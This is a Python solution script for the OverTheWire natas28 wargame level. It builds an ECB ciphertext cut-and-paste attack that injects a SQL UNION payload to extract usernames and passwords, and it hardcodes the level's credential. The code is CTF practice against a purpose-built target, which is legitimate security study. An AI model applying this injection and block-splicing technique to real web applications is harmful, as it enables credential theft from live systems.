#!/usr/local/bin/python3


import requests,sys,base64,urllib,binascii


url_post = 'http://natas28.natas.labs.overthewire.org/index.php'
url_get = 'http://natas28.natas.labs.overthewire.org/search.php/?query='
cred = ('natas28', 'JWwR438wkgTsNKBbcJoowyysdM82YjeF')
hdrs = {'Content-Type': 'application/x-www-form-urlencoded'}
prx = {
  'http': 'http://127.0.0.1:8080',
  'https': 'http://127.0.0.1:8080',
}

class bcolors:
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    ENDC = '\033[0m'

# print encrypted_msg_url_enc
# encrypted_msg_base64 = urllib.unquote(encrypted_msg_url_enc)
# encrypted_msg_ascii = base64.b64decode(encrypted_msg_base64)
# print binascii.hexlify(encrypted_msg_ascii)
#
# encrypted_msg = binascii.hexlify(encrypted_msg_ascii)
# n=0
# enc_msg_list = []

def xor_hex_str(str1,str2):
    assert len(str1)==len(str2)
    str1_hex = int(str1, 16)
    str2_hex = int(str2, 16)
    return str(format(str1_hex ^ str2_hex, '02x'))


def encode_payload(pld):
    payload_ascii = binascii.unhexlify(pld)
    payload_base64 = base64.b64encode(payload_ascii)
    return urllib.parse.quote(payload_base64, safe ='')

def decode_answer(ans):
    ans_base64 = urllib.parse.unquote(ans)
    ans_ascii = base64.b64decode(ans_base64)
    #print(ans_base64)
    return str(binascii.hexlify(ans_ascii), 'ascii')


def assemble_payload(index,modified_prev_block):
    payload = ""
    for i in range(0,index+1):
        if i == index-1:
            payload+=modified_prev_block
            continue
        payload+=enc_msg_list[i]
    return payload


#block is string in hex format XX without leading 0x
def divide_block_to_bytes(block):
    n = 2 #two chars for each byte
    print("Dividing block " + block)
    block_byte_list = [block[i:i+n] for i in range (0, len(block), n)]
    return block_byte_list


def apply_padding_xor(byte_list, pad_size):
    xored_byte_list = byte_list[:-pad_size]
    print("DEBUG: Applying padding to block:", byte_list)
    print("DEBUG: Padding size:", pad_size)
    pad_size_str = str(format(pad_size, '02x')) #convert padding byte to string
    print("DEBUG: Padding in hex: " + pad_size_str)
    print("DEBUG: Applying padding to last", pad_size, "bytes only:", byte_list[-pad_size:])
    for byte in byte_list[-pad_size:]:
        xored_byte_list.append(xor_hex_str(byte, pad_size_str))
    return xored_byte_list



def xor_guess_and_guessed_bytes(g, ind, pad_prev_block, guessed_block):
    guess_xored_list = pad_prev_block[:]
    print("DEBUG: XOR with guess", g, "on position", ind, "to padded block", pad_prev_block)
    guess_xored_list[ind] = xor_hex_str(g, pad_prev_block[ind])
    print("DEBUG: Result after guess applied:", guess_xored_list)
    print("DEBUG: XOR with previously guessed ", guessed_block)
    assert len(guessed_block) == len(guess_xored_list)
    payload_block_list = []
    for i in range(0,len(guess_xored_list)):
        #print "DEBUG: XOR", guess_xored_list[i], guessed_block[i]
        payload_block_list.append(xor_hex_str(guess_xored_list[i],guessed_block[i]))
    #print "DEBUG: final result:", payload_block_list
    return payload_block_list


def print_hex(string):
    base = 32
    for i in range (len(string)//32):
        if i%2 == 0:
            print(bcolors.OKBLUE + string[base*i:base*(i+1)] + bcolors.ENDC, end='')
        else:
            print(bcolors.OKGREEN + string[base*i:base*(i+1)] + bcolors.ENDC, end='')
    print('\n\n')

#input_list = ["A", "AA", "AAA", "AAAA", "AAAAA", "AAAAAA", "AAAAAAA",\
#"AAAAAAAA", "AAAAAAAAA", "AAAAAAAAAA", "AAAAAAAAAAA", "AAAAAAAAAAAA", "AAAAAAAAAAAAA", "AAAAAAAAAAAAAA", \
#"AAAAAAAAAAAAAAAAAAAAAAAA", "BBBBBBAAAAAAAAAAAAAAAAAAA", "BBBBBBBBBBAAAAAAAAAAAA", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"]
new_sql = " UNION ALL SELECT concat(username,0x3A,password) FROM users #"

input_list = ["", "&", "%26", "a", "b", "'", "%27", "A"*9, "A"*10, "A"*10 + "B"*14, "A"*10 + new_sql + "B"*(16-len(new_sql)%16), "A"*11, "A"*12, "A"*13]


for query in input_list:
    print(query, len(query))
    r = requests.post(url_post, auth = cred, proxies = prx, headers = hdrs, data = "query="+query, allow_redirects=False)
    loc_header = r.headers['Location'] # check position of equals sign in the Location header (after query=)
    equal_sign_pos = loc_header.find('=') + 1
    print(urllib.parse.unquote(loc_header[equal_sign_pos:])) # print URL-decoded query parameter
    ans_hex = decode_answer(loc_header[equal_sign_pos:])
    print_hex(ans_hex)
    #print divide_block_to_bytes(ans_hex)


hex_get_query = "b69b50e5736aad13c5d63e684eefbb29"
hex_get_query += "d8ae51d7da71b2b083d919a0d7b88b98" #append full block of PKCS#7 padding
r = requests.get(url_get + encode_payload(hex_get_query), auth = cred, proxies = prx)
print(r.content)
hex_get_query = "1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2ab880a8f136fbeb98967891324a1b075bdfa1054ec68515cf96f2a5544591947904f4b2abf2c2d7686aa72a53151c970"
r = requests.get(url_get + encode_payload(hex_get_query), auth = cred, proxies = prx)
print(r.content)


# post_query_hex = "f633e6b05f866226b863817112b1c92b"
# r = requests.post(url_post, auth = cred, proxies = prx, headers = hdrs, data = "query="+binascii.unhexlify(post_query_hex), allow_redirects=False)
# loc_header = r.headers['Location']
# equal_sign_pos = loc_header.find('=') + 1
# print decode_answer(loc_header[equal_sign_pos:])
